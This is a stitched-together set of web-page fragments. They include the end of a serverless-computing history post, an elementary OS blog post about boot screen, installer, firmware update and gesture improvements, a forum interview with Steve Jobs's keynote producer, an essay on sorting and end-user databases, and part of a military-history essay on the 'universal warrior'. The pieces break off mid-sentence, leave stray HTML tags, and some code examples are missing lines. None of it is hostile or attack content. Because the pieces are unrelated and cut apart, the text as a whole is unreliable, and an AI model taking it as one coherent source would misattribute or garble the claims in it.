aria-disabled="false" href="#everything-serverless"><span></span></a></span></h3><p>Nearly all services can become serverless: compute, storage, database, messaging, and more. Indeed, there are already several different types of managed serverless services: Platform-as-a-Service (PaaS), Function-as-a-Service (FaaS), Container-as-a-Service (CaaS), and Database-as-a-service (DBaaS), just to name a few.</p><p><img src="https://www.koyeb.com/static/images/blog/types-of-serverless-services.png" alt="Managed Serverless Services"></p><p>At its core, going serverless means outsourcing the work of managing your underlying infrastructure. It means no longer having to scale, operate, or update the servers that run your applications. Cloud service providers now handle these operations and offer them as a service.</p><h3 id="the-technologies-enabling-serverless">The Technologies enabling Serverless<span><a tabindex="0" aria-disabled="false" href="#the-technologies-enabling-serverless"><span></span></a></span></h3><p>Serverless technologies are possible thanks to a combination of several computer science advancements:</p><ul><li><strong>Containers:</strong> The rise of containerized resources with improvements in core Linux cgroups feature, hardware virtualization and the Docker/OCI are core enablers, allowing efficient virtualization and abstraction of physical resources.</li><li><strong>Ability to host arbitrary code:</strong> The ability to securely host any code with isolation thanks to virtualization progress is essential to allow mainstream serverless.</li><li><strong>Distributed Computing:</strong> The increase in network bandwidth and reduction of network latency has enabled wider distributed computing adoption, which is essential to provide variable amounts of computing power, above the limits of a single physical server.</li><li><strong>Versioning, naming and discovery:</strong> The last decade has seen significant progress in continuous deployment technologies with improvements in versioning and service discovery tooling, increasing the capacity to deploy in a distributed environment.</li><li><strong>Events and message passing:</strong> Event-driven architectures are a significant enabler for serverless as tasks can easily be distributed and processing power can grow as requests come.</li><li><strong>Microservices</strong>: Creating small, specialized services is essential to provide the right amount of resources for each processing function.</li><li><strong>Autoscaling:</strong> Finally, autoscaling is a core component of serverless, which has itself been made possible by strong advancements in load-balancing and monitoring technologies.</li></ul><p>The AtLarge Research Team provides a good overview of the technological evolution that lead to serverless in <a target="_blank" rel="noopener" href="https://atlarge-research.com/pdfs/serverless-history-now-future18ieeeic.pdf"><em>Serverless is More: From PaaS to Present Computing</em></a>, give it a read if you want to dive deeper!</p><h2 id="further-reading">Further reading<span><a tabindex="0" aria-disabled="false" href="#further-reading"><span></span></a></span></h2><p>We hope you enjoyed this short retrospective on the history of cloud computing and serverless.

February 5, 2021 | https://blog.elementary.io/hardware-improvements-coming-to-elementary-os/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/hardware-improvements-coming-to-elementary-os/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>We’ve been on a bit of a device enablement kick lately: from <a href="https://blog.elementary.io/elementary-os-on-pinebook-pro">Pinebook Pro</a> and <a href="https://blog.elementary.io/elementary-os-on-raspberry-pi">Raspberry Pi</a> to <a href="https://blog.elementary.io/devices-slimbook">Slimbook</a>, <a href="https://blog.elementary.io/now-shipping-elementary-os#laptop-with-linux">Laptop With Linux</a>, and <a href="https://blog.elementary.io/now-shipping-elementary-os#star-labs">Star Labs</a>, we’ve been working with specific devices and device makers more than ever. We covered these efforts—and why they’re so important—in <a href="https://blog.elementary.io/our-2020-in-review#hardware">our 2020 in review</a>.</p>

<p>There’s another angle, though, that we’re starting to see come into play: when elementary is more directly involved, the improvements made for these specific devices benefit <em>everyone</em>—not just one specific device or OEM. Here are some areas in elementary OS that are seeing improvements directly due to recent hardware enablement efforts:</p>

<h2 id="boot-experience">Boot Experience</h2>

<p>We’ve been working on the first-run experience of elementary OS for a few years now, including a <a href="https://blog.elementary.io/say-hello-to-the-new-greeter">new login and lock screen greeter</a>, a <a href="https://blog.elementary.io/get-settled-into-elementary-os-with-onboarding">new “welcome” onboarding experience</a>, and the <a href="https://blog.elementary.io/meet-the-upcoming-installer">new Installer</a> coming with elementary OS 6. An area we’ve also been working on for elementary OS 6 is the boot screen itself: what you see while your device is turning on, but before the operating system is fully booted.</p>

<p>Our approach to the new boot screen was informed heavily by our work with Star Labs; they ship elementary OS on their laptops, and several system components are updatable via the <a rel="nofollow noopener noreferrer" target="_blank" href="https://fwupd.org/">Linux Vendor Firmware Service using fwupd</a>. When installing a system firmware update via fwupd, part of the process requires a reboot so the update can happen “offline” (e.g. when the operating system itself is not fully running). This offline update can show feedback and progress on the boot screen, if the boot screen supports it. In elementary OS 5.1, that just gives you a slowly pulsing elementary “e” logomark, so Star Labs installs their own OEM boot screen—which works, and is the kind of work OEMs often do for better integration.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/boot-loading.jpg" alt="Boot Screen: loading spinner"></p>
  <figcaption>The elementary OS 6 boot screen on a Star LabTop Mk IV</figcaption>
</figure>

<p>We’ve been working on something even better out of the box: a minimalist, seamless boot screen that also supports modern features like firmware updates and encrypted disk unlocking. This boot screen builds on the work of the <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.freedesktop.org/wiki/Software/Plymouth/">FreeDesktop.org Plymouth project</a>, delivering flicker-free boot on many systems. Our design approach was to let the OEM branding—if provided—shine while offering minimal supplemental information. If an OEM sets a boot logo in their system firmware, our boot screen will load that and display it. While the operating system is loading, we add a small, minimal spinner in the same style as loading spinners in elementary OS. If an encrypted disk needs to be unlocked, there’s a minimalist password entry provided. And finally, when installing firmware updates, we provide straightforward messaging using the same typography as in elementary OS 6.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/boot-password.jpg" alt="Boot Screen: unlocking an encrypted drive">

  <figcaption>

  </figcaption>
</figure>

<p>The end result is that elementary OS 6 is an even more seamless experience from powering on your device through logging in, while also supporting features OEMs care about. For a fallback—e.g. on platforms that don’t support boot logos, like Raspberry Pi or Pinebook Pro—we show the elementary “e” logomark, similar to today. This fallback feature was <a rel="nofollow noopener noreferrer" target="_blank" href="https://gitlab.freedesktop.org/plymouth/plymouth/-/merge_requests/125">contributed to Plymouth upstream</a>. This boot screen work was tackled largely by <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/meisenzahl">Marius Meisenzahl</a>, so be sure to consider <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/meisenzahl">sponsoring him on GitHub Sponsors</a> for all his contributions.</p>

<h2 id="installer--initial-setup">Installer &amp; Initial Setup</h2>

<p>The new installer for elementary OS 6 has been <a href="https://blog.elementary.io/meet-the-upcoming-installer">in the works</a> for quite some time. From the beginning, it was designed to handle very little: getting the OS onto your device. While designing and developing the installer, we realized how we could also cater to OEMs without needing an entirely separate OEM installation flow: <em>every</em> install is treated like an OEM install.</p>


<p>We’ve worked with <a rel="nofollow noopener noreferrer" target="_blank" href="https://system76.com/">System76</a> to create this new installer, designing the front-end while building on their distinst back-end. Their perspective as an OEM helped inform some design decisions, as has working with our OEM retailers. The new installer essentially handles the following tasks:</p>

<ol>
  <li>Select a language and keyboard layout to use in the installer</li>
  <li>Choose to try a live “Demo Mode” or to install the OS</li>
  <li>Select a drive to install to</li>
  <li>Reboot to continue, or shut down to set up later</li>
</ol>

<p>This last step is the key to the OEM-friendly approach; since the installer explicitly does not handle creating or setting up a user account, the next step is identical whether you’re installing the OS for yourself, you’re installing the OS for a friend or family member, or an OEM has pre-installed the OS on a device: the end-user boots the device and is handed off to Initial Setup to create their account.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/initial-setup.png" alt="Initial Setup" width="916" height="666"></p>
  <figcaption>Initial Setup creates the first user account, regardless of how the OS was installed</figcaption>
</figure>

<p>This Initial Setup flow means a system administrator or lower-volume OEM can manually step through the couple of steps to install the OS each time, and be confident that the user will unbox the device and be able to set it up as expected. It also means larger OEMs can create an installation image from this installed state and image it directly to their devices’ storage without manual steps. It even means that builds for specific hardware—like the ARM-based Pinebook Pro and Raspberry Pi—have you flash an “installed” image onto the storage medium, and you get the exact same Initial Setup experience as any other installation. Regardless of how you get elementary OS, the Installation and Initial Setup process is always a tested, first-class experience.</p>

<h2 id="firmware-updates--system-information">Firmware Updates &amp; System Information</h2>

<p>As mentioned in the Boot Experience section, updatable firmware—specifically using LVFS and fwupd—is an emerging feature among our OEM retailers. In addition to the boot screen work here, we’ve been hard at work adding this capability right into System Settings. Much of this front-end work was again handled by <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/meisenzahl">Marius Meisenzahl</a>, building on the excellent work of <a rel="nofollow noopener noreferrer" target="_blank" href="https://blogs.gnome.org/hughsie/">Richard Hughes</a> and fwupd.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/system-firmware.png" alt="Firmware updates">
<img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/system-firmware-details.png" alt="Firmware update details"></p>
  <figcaption>
    <p>Firmware updates in <em>System Settings</em></p>
  </figcaption>
</figure>

<p>While we were working on enabling firmware updates, we redesigned the <em>System Settings</em> → <em>System</em> area—formerly <em>System Settings</em> → <em>About</em>—with a new tabbed layout and refreshed typography. The Operating System tab shows off a dynamic OS logo using the user’s accent color and the default release wallpaper, with a better layout for OS links and actions. The Hardware tab pulls information from the system hardware as well as <code>/etc/oem.conf</code>, enabling OEMs to provide a high-resolution logo or product image, model-specific branding, and a link for their own website. We also improved the detection and display of certain hardware, especially GPUs and ARM processors.</p>

  <figcaption>

</figure>

<p>All of these improvements will be shipping to users of elementary OS 6. Firmware updates require the firmware be uploaded to the LVFS, but we’re seeing manufacturers large and small—from Star Labs and 8bitdo to Logitech, Dell, and Lenovo—adopt it, so there’s a good chance at least some of your hardware will be updatable in this way.</p>

<h2 id="num-lock--caps-lock-indicators">Num Lock &amp; Caps Lock Indicators</h2>

<p>Some keyboards and devices don’t have built-in Num Lock or Caps Lock indicators—whether it’s a minimalist mechanical keyboard or a laptop. Star Labs laptops have this quirk, and so on GNOME-based OSes, they install an extension to add these indicators to the top panel. In parallel, we have received user requests to support such indicators in elementary OS for people who have this sort of hardware.</p>

    <p>Enable Num Lock and Caps Lock indicators in <em>System Settings</em></p>
  </figcaption>
</figure>

<p>We’ve now added this capability to the top panel in elementary OS 5.1 and newer, bringing it to OEMs like Star Labs as well as any end user who wants it; just head to <em>System Settings</em> → <em>Keyboard</em> → <em>Layout</em> and turn on the “Show in Panel” switch for whichever indicator you’d like.</p>

<h2 id="multi-touch-gestures">Multi-touch Gestures</h2>

<p>We’ve written more extensively about <a href="https://blog.elementary.io/multitouch-gestures-in-elementary-os-6">our work with multi-touch gestures in elementary OS 6</a>, but it is important to give some of the credit to our work with OEMs; some retailers like Slimbook currently include third-party software for trackpad gestures in their images of elementary OS 5.1, but it’s not as integrated as it could be. Our goal is for it to be built into the operating system and not require configuring anything out of the box—while also offering sensible preferences where users expect in <em>System Settings</em> → <em>Mouse &amp; Touchpad</em> → <em>Gestures</em>.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/hardware-improvements-coming-to-elementary-os/gestures.png" alt="Gestures settings" width="856" height="556"></p>
  <figcaption>
    <p>Enable and configure multi-touch gestures in <em>System Settings</em></p>
  </figcaption>
</figure>

<p>Now all multi-touch-capable trackpads and touchscreens will benefit from this gesture work, instead of it being different depending on the OEM or requiring extra third-party tools.</p>

<h2 id="performance">Performance</h2>

<p>Lastly, a significant amount of performance work has been going into elementary OS 6 thanks to our work on Pinebook Pro and Raspberry Pi builds; this class of hardware is lower-powered than our typical target hardware, so every little bit helps. We’ve largely been reducing and asynchronizing inter-process communication between desktop components, removing unused code, and reducing disk I/O—especially important on lower-clocked processors and slower storage mediums like SD cards.</p>

<p>And of course, any performance improvements on the lower end also benefit higher-end devices as well. Most of this work has been handled by <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/davidmhewitt">David Hewitt</a>; you can <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/davidmhewitt">sponsor him on GitHub Sponsors</a> to encourage him to keep it up!</p>

If you look at the primitive narratives in Steve’s presentations at NeXT, you can see the influence that our experience at Pixar had on the storytelling over time that resulted in events like the iPhone launch.&nbsp;&nbsp;</p><p>What few people realize is that, like Pixar movies, there is a color scheme throughout the 90 minutes, and an emotional ramp. And yes there are heroes and villains, action sequences, humor and plot twists. You have to be careful not to wear the audience out. You have to manage building to a climax. Steve understood this better than anyone.</p></div></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><p>How much time went into preparing the iPhone demo?</p></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><div><p>Quite a lot! That’s the thing, no other CEO would have imagined spending the time Steve invested in his keynotes. For the most important ones, we started 3 or so months out. He would run the company until maybe 2:00 pm and then spend a few hours with me. Then he may start in again in the evening, me at my house and him at his, and we’d stay up until midnight. Sometimes we’d be at it again at 6 am.&nbsp;</p><p>I saw part of my job—and Steve never knew this—as managing his emotional ramp to the event. I’ve even described my job much like being a product manager. There were all kinds of things that could mess that up: the product timing, or the photos that were taken weren’t good enough, or he had a bad day, or we didn’t have all the assets he needed… or at times too many!&nbsp;</p><p>With movies, you never want anything to affect suspension of belief. You want your audience to stay in that magical moment and not think about how things are done.&nbsp;&nbsp;With the iPhone, we wanted to show that if you rotate your phone to landscape mode, the photo would automatically rotate too. But we were not projecting a video of the actual iPhone that Steve was holding in his hand, only the video from the iPhone. That would have made it shaky on the big screen with distracting reflections. </p><p>So we showed a graphic of an iPhone, to look like the Keynote slides, and projected Steve’s demo iPhone screen into the exact right position in the graphic.&nbsp;The trick was that when Steve rotated the iPhone to landscape mode, the right thing to do to keep customers in the moment was to rotate the iPhone graphic with its inserted video feed rotating in sync as well. But how?</p><div><div><a href="https://cake.imgix.net/m/FYLjTlvKhnRr_1531331370341.png" itemprop="sharedContent" itemscope="" itemtype="http://schema.org/ImageObject"><img src="https://cake.imgix.net/m/FYLjTlvKhnRr_1531331370341.png?fit=max&amp;fm=pjpg&amp;h=640&amp;q=65&amp;w=680"><meta content="https://cake.imgix.net/m/FYLjTlvKhnRr_1531331370341.png" itemprop="contentUrl"></a></div></div></div></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><div><p>It took a month for one of the brilliant Apple engineers to work out how to do this. It looked natural to the audience and no one had to think about how it happened.&nbsp;</p><p>When Steve saw this happen he first time, he knew it’d be magic and it had to be shown live. He rotated it back and forth several times in his demo and no one ever questioned what they were seeing because it looked exactly they way it should.&nbsp;&nbsp;</p><p>If I remember, the internal estimate of the marketing power of the iPhone demo Steve did that day was in excess of $1 billion of PR spend from demo until we shipped.</p><div><div><a href="https://cake.imgix.net/m/DYlF8vV1XR09_1531331556178.png" itemprop="sharedContent" itemscope="" itemtype="http://schema.org/ImageObject"><img src="https://cake.imgix.net/m/DYlF8vV1XR09_1531331556178.png?fit=max&amp;fm=pjpg&amp;h=640&amp;q=65&amp;w=680"><meta content="https://cake.imgix.net/m/DYlF8vV1XR09_1531331556178.png" itemprop="contentUrl"></a></div></div></div></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><p>Amazing!

We learned from the creative process Pixar uses: iteration in front of people who can shape it by adding constructive feedback.

I want you to fucking go home right now and tell me why I shouldn’t fire you tomorrow.” So I went home that night and I probably worked on 15 or 16 versions of an email trying to explain everything. But then I just decided to say “Steve, you know how I feel, but you’re the boss. You let me know tomorrow whether I’m fired or not.” I never heard another word about it.</p><p>The mythology of him mostly comes from individuals that didn't survive around him. The people who got close knew the rules, knew how to work with him, knew his core desires and what he was trying to achieve. They never really had problems with it.&nbsp;&nbsp;</p></div><div><p>Someone told me early on that if you do something great, you just have to acknowledge it yourself because you’re not going to get it from him except on a rare occasion. A lot of people who weren’t used to that would come in to present their product plan or whatever, and they would be seeking to make themselves look good and get praise from Steve. If he got a whiff of that, he would rip you down a peg.&nbsp;</p><p>He was usually right because the person usually didn’t do a great job. Those are the ones who flamed out and then had the horrible things to say because they couldn’t admit to themselves that they couldn’t cut the mustard.</p><p>He was a complex individual but he always desired the best out of everybody. He was ultimately very caring. He had his own relationship with my daughter from the age of 4 years old and let her come to rehearsals and events. He even asked her opinion a few times when the team couldn’t decide between particular graphics to use.</p></div><div><div><a href="https://cake.imgix.net/m/j4D3PCrR4Pyl_1531332483022.jpeg" itemprop="sharedContent" itemscope="" itemtype="http://schema.org/ImageObject"><img src="https://cake.imgix.net/m/j4D3PCrR4Pyl_1531332483022.jpeg?fit=max&amp;fm=pjpg&amp;h=640&amp;q=65&amp;w=680"><meta content="https://cake.imgix.net/m/j4D3PCrR4Pyl_1531332483022.jpeg" itemprop="contentUrl"></a></div></div></div></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><p>Give us an example of when he went off on you because he expected better.</p></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><div><div><p>When we launched the Lifesaver iMacs (the color ones), Steph Adams [Owner of Adams &amp; Asscociates—the outside production company for Apple] and I were trying to bring them out from behind the screen and raise them up out of their pedestals. A week before the event and we were still struggling to synchronize them and make the motion smooth. This was before computer-controlled movement machinery was readily available.</p><p>After mentioning this to Steve, he literally says, “I know the guys from Cirque du Soleil, why don’t you call them?” With one week left, we couldn’t do that so we stuck with our way. It was a hand-crank thing. When you looked at it close, it was really bad. But when you were in the audience, you couldn’t tell unless you knew what to look for. However, Steve was on the stage watching these things not perfectly aligned with a little bit of stuttering. He wasn’t happy and we could see it in the video feed we were watching.</p><p>The show went off, no one ever noticed or mentioned it in the press, but yet he noticed. He pulled me and Steph aside. There were people all around so he didn’t scream or yell at us. It was one of those “I’m really disappointed. At any other time I’d probably fire you.” For ten minutes he went on and on. We looked at each other and just melted into the floor.</p><p>But we came back the next show having done our research. We now had the beginnings of our computer-controlled systems. We could bring things from the back of the stage, under the stage, or out of a cabinet—and twirl them as they emerged. Cirque du Soleil couldn’t do it better than we did it.</p><p>As I look back, if we had not been berated so much, we wouldn’t have seen that these were amazing products and they could have been launched so much better.</p></div><div><div><a href="https://cake.imgix.net/m/wl9s4Lpk9wHX_1531333042972.jpeg" itemprop="sharedContent" itemscope="" itemtype="http://schema.org/ImageObject"><img src="https://cake.imgix.net/m/wl9s4Lpk9wHX_1531333042972.jpeg?fit=max&amp;fm=pjpg&amp;h=640&amp;q=65&amp;w=680"><meta content="https://cake.imgix.net/m/wl9s4Lpk9wHX_1531333042972.jpeg" itemprop="contentUrl"></a></div></div></div></div></div><meta content="The man who produced Steve Jobs’ keynotes for 20 years." itemprop="headline"></article></div></li><li><div data-context="conversation"><article itemscope="" itemtype="http://schema.org/DiscussionForumPosting"><div><div itemprop="articleBody"><p>When I did his keynotes at NeXT, I don’t remember him ever being scripted.

        <p id="6595f0c7-f94b-4772-8c12-22b107c82c47">End-user databases are all the buzz these days — Notion, Airtable, Coda, Roam, etc. These products have made it possible for people to model information in a way that feels more natural and intuitive to the way we experience it in our daily lives.</p>
        <p id="69014b56-b04f-4baf-be70-2c0ba0ad30e9">I love building products like Notion, but building these kinds of products is hard. For two reasons:</p>
        <ol id="3c07bc59-4c8a-4b48-bdb0-1bf930336c2e" start="1">
          <li>Most people don't have the technical literacy about databases and information architecture to actually automate and organize their lives with these tools.</li>
        </ol>
        <ol id="d5625fcf-2e32-45ce-acc4-d73e1d38d037" start="2">
          <li>The databases we have today aren't well-suited for dynamic user-generated filters and sorts.</li>
        </ol>
        <p id="aa0edb68-c072-4214-acf9-8e6e243900dd">This second challenge is more technical and I will hide all of these programmer-related details behind a toggle so you don't have to read them if you'd like.</p>

Solutions to this problem vary widely and make some sort of trade-off between scalability (performance) and complexity.</p>
              <p id="9dd2cc1a-1eb6-4af8-9c22-d486c3e9dc99">Some applications load the entire end-user database in-memory. This creates long initial load times, but really performant interactions once the application loads. There are obvious scalability issues with this approach, but it is fairly simple to implement.</p>
              <p id="e10696df-1d8a-47ff-9365-701d9ff58d00">Other applications resort to O(n) scans on the server to fetch data and filter/sort records in memory with a few caching and indexing optimizations when convenient. The problem here is that users can create their own columns and filters dynamically. If your cloud application is backed by a SQL database, for example, it’s worrisome to allow users to edit the database schema and create an unbounded number of tables and indexes. Thus, you must resort to filtering records in-memory.</p>
              <p id="30d92414-92a1-4469-99ba-643219826c94">If you're dedicated to O(log n) queries, you'll need to build indexes yourself (unless there's some amazing database I am unaware of). On every write, you can compute what indexes need to be updated and you write to a NoSQL database to incrementally update a cached query result. This can lead to a good solution, but it comes at the cost of consistency. Now that you're building your own indexes outside of the database, writes are no longer transactional and you lose the guarantee of being able to read your own write.</p>
              <p id="c04b352e-bd9a-44ad-ba88-17ac5cc502ff">Another solution is to have a separate database for every user and allow users to edit the schema of their own isolated database. This allows writes to be transactional, but creates other kinds of collision problems (i.e. dealing with merge conflict) when you want users to be able to collaborate. With separate databases for each user, you're also doing a lot more computing labor, especially if the same records are shared amongst many people.</p>
              <p id="7c45a3a9-7051-4386-a53f-d246c9ba7310">Long story short, existing databases are not great for building end-user databases.</p>

Databases are no different, they're also containers of sorted information.</p>

        <h2 id="b5562604-4d38-4feb-84bd-6f536aea58cc">What is sorted information?</h2>
        <p id="2238e190-e73f-43c3-96d3-44daa545e966">Alphabetical, numerical, compound, lexicographical Encodings.</p>
        <p id="e4db1ca2-03e3-4767-883b-83b12f484fd6">The simplest way to sort something is alphabetically (a.k.a <em>lexicographically</em>) and this is how words are sorted in the dictionary. But we often find ourselves sorting by more than one property. For example, a contact list is often sorted by last name, <em>then</em> first name. This is called a <strong>compound sort</strong>. </p>
        
        <p id="3f686c5c-6eed-4ad6-8eb3-73168fa60be6">For example, notice that "Thomas Robins" should come before "Charlie Robinson" when sorting this way and that a compound sort is fundamentally different from simply joining the words together and then sorting.</p><pre id="82947e67-674e-4edd-8b12-6d7a800dee7a"><code>// Compound Sort: Last, First
Robins, Thomas
Robinson, Charlie

// Joining the words, then sorting: Last + First
RobinsonCharlie
RobinsThomas</code></pre>
        
        <p id="c545d059-b2b0-4678-8fd4-40aa6d7bdafd">We do this kind of compound sorting all over the place. Dates, in particular, are compound sorted by year, <em>then</em> month, <em>then</em> day.</p><pre id="cc0fb85d-ab5f-4e44-8947-0a504713b758"><code>January 10, 2019
...
December 28, 2019

August 26, 2020
...</code></pre>
        <p id="ef7175d9-a258-4f95-afe7-0ce9b274df54">Notice that this kind of sorting isn't exactly alphabetical. The months in a year are definitely not sorted alphabetically — each month has an underlying order within a year. Even days of the month aren't alphabetically sorted — they're numerically sorted.</p>
        
        <p id="9d475882-2657-4dc0-a0d4-7e8456c1a201">Numerical sorting is different from alphabetical sorting because alphabetical sorting compares letter-by-letter. For example, if we sorted numbers alphabetically, then 10 would come before 2 because the first digit "1" is before "2".</p><pre id="e4876df9-d390-4c6e-b0a8-c3201a7e43fa"><code>// Alphabetical Sort
1
10

9

// Numerical sort

11</code></pre>
        <p id="934e9af4-eb81-43ab-8dd1-9d973c87eb93">A simple way to represent numbers in a way that can be sorted alphabetically is to put zeros at the beginning of the number. This works well for small numbers with a known maximum size such as the months in a year. </p><pre id="245e5864-d979-4b11-944c-eb6a46ade312"><code>// Zero-padded numbers representing months in a year.

        <p id="becf436f-03a3-4bad-a0f7-519f75156d75">And in fact, we can represent dates in a way that can be sorted alphabetically using <a target="_blank" href="https://en.wikipedia.org/wiki/ISO_8601">ISO 8601 date format</a>. </p><pre id="6c4b1b11-3f63-4789-b0d5-4e0145fc9750"><code>2019-01-10

        <p id="82017443-040f-4acf-9810-23cd870f9c5e">Representing dates this way is convenient because it doesn't require domain knowledge to understand how to sort them. There are an infinite number of things that can be sorted arbitrarily: a deck of cards, the status of a project, your rock collection—they are all just different types of things.</p>
        <p id="7ddb731a-5ae6-4745-8134-9dc166ec26f4">In general, lexicographical encodings are important because they allow databases to store arbitrary information in the correct order without needing additional knowledge about the type of information that is being sorted.</p>

To explore this analogy further, let's imagine that you are in charge of administering a police department where you keep track of a variety of information about every police officer in your region — name, badge number, address, and precinct, among other details.</p>
        
        <p id="60068181-62be-45e4-979e-b7a04b4d0ed9">As the administrator of this information, you're responsible for making sure that everything is up to date and easily accessible.</p>
        
        <p id="244c9ed1-6e90-4a3b-a370-59fa67d0cd5f">To keep things simple, you start by keeping all officer information in a filing cabinet sorted by badge number.

        <p id="47066dd1-5373-4fac-8a18-0a29a5703390">One day, the police chief asks you for the address of every officer in the 60th precinct.</p>
        <p id="46c18841-1de6-4cd9-a084-cb39b033b939">With all of this information in a single filing cabinet sorted by badge number, this is a painful request because you have to scan through every file and check if each officer is in the 60th precinct.</p>
        <p id="9fb77909-54eb-4ecb-9059-10642f19e8f1">Maybe this is just a one-time request so you can labor over it and be done with it, but the police chief says that every month he wants to mail a bonus check to every officer in the precinct with the most arrests.

<p>This is the second part of a three part (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, II) discussion of the idea of a ‘universal warrior’ – the assumption that there is a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of fundamental truth for understanding war, either in the past or present, or else a useful blueprint for current life more generally.  In investigating this question, we are using Steven Pressfield’s <a href="https://stevenpressfield.com/category/the-warrior-archetype/">recent video series</a> as our foil, since it is a more completely explained expression of this idea and one should always try to debate the stronger form of the opposing argument.</p>



<p><a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">Last time we took a look at the social place of people involved in war</a>.  We found that, far from there being a universal combatant, distinctions between soldiers and warriors are both significant for the present and important for understanding the past.  Moreover, beyond that simple dichotomy, the idea of a universal war experience in turn conceals the basic fact that many people who were neither warriors nor soldiers, not properly combatants of any kind, experienced war in unique ways, be they victims of warfare, homefront supporters, or economically invested in the enterprise.  Already we have seen that there’s far more than just one sort of person <em>with</em> a war experience.</p>



<p>This week (and next), we’re narrowing our focus just to the combatants and asking to what degree is even the experience of combat and soldiering (or ‘warrioring’) common.  Does it evoke the same emotions or require the same kinds of character?  Is it conditioned on the same values?  Does it involve the same activities or experiences?  Is combat understood the same, from one society to another?</p>



<p>Even so narrowed, our topic is necessarily massive, since we are considering the experience of <em>all</em> wars at <em>all</em> times.  But fortunately (for the wear and tear on my keyboard, if nothing else) our thesis – that there are quite a lot of broad universals in the war experience – does not need to be tested <em>everywhere</em> if it can be shown to fail in many places.  Consequently, we are going to bounce around a bit here; I hope the reader will understand that I mean these examples to be broadly representative, rather than exhaustive.</p>



<p>If that method seems a bit patchwork, it is important to remember just how <em>expansive</em> the argument implied by this notion of a ‘universal’ warrior or war experience is.  <strong>In arguing for a ‘warrior archetype’ that recurs in all cultures</strong> (<a href="https://stevenpressfield.com/2020/09/warrior-episode-eight/">as Steven Pressfield does</a>),<strong> or more obliquely in arguing that some given sort of long vanished ‘warrior culture’ </strong>(like the Spartans) <strong>provides material for emulation today, they are making a claim for a <em>human universal</em>, and a profound one at that</strong>.  After all, the suggestion is not that, for instance, some particular Spartan (or knightly, or Viking, or Samurai, or Apache, or…) tactic or weapon should today be used, but that the <em>ethos</em> and worldview of those ‘warriors’ is valuable because it taps into a true human <em>constant</em>.</p>



<p><strong>Because after all, a lot has changed!</strong>  We no longer fight with spears, or muskets.  Our wars are, in some obvious ways, vastly different from the conflicts of the past.  <strong>Yet for these past values, social systems, or habits to be directly applicable to the present, <em>something</em> would have to be fundamentally constant, at a deep and fairly profound level, in human conflict</strong>.  And it has to be something rather more than ‘people die in war, and that is sad for some people.’  After all, <a href="https://www.cnbc.com/2019/12/27/the-10-most-dangerous-jobs-in-america-according-to-bls-data.html">people die in logging</a>, and you don’t hear all of these fellows waxing lyrical about the ‘universal lumberjack’ (though I can assure you, if it does exist well…<a href="https://youtu.be/pfRdur8GLBM">then he’s a lumberjack and he’s ok</a>).  It has to be something more than ‘war is scary’ because after all so too is running <em>into </em>burning buildings, but we’re not discussing patterning our lives around the ‘universal firefighter’ either.  There would have to be some more profound truth to the phrase – to abuse the <em>Fallout</em> series – that ‘War, war never changes.’</p>



<p>And that is a thesis we can test!  Does war change from one culture to the next?  From one period to the next?  From one place to the next?  Let’s find out!</p>

<h2>Raids and Battles</h2>



<p>So what is the experience of combat like?  Well, first we have to ask, <em>what sort of combat do you mean?</em></p>



<p>As I’ve noted before, the branch of military history most focused on the experience of combat is what is sometimes called the ‘Face of Battle’ school, after John Keegan’s <em>The Face of Battle</em> (1976).  Taking three battles from English history (Agincourt, Waterloo and the Somme), Keegan aimed to reconstruct the experience of those battles in its own long chapter, beginning with the campaign that led to them, then discussing the interaction of men and weapons (infantry vs. cavalry, cavalry vs. cavalry and so on) seeking to use the physics of the battlefield to explain how these interactions would go.  He then focuses on how men cohered in the face of terror; then on to the casualties and the aftermath.</p>



<p>We might imagine that this standard order (replicated, I might add, in <em>The Western Way of War </em>(1989), albeit with more problems of evidence) implies a standard sequence of events, moments and emotions in a battle.</p>



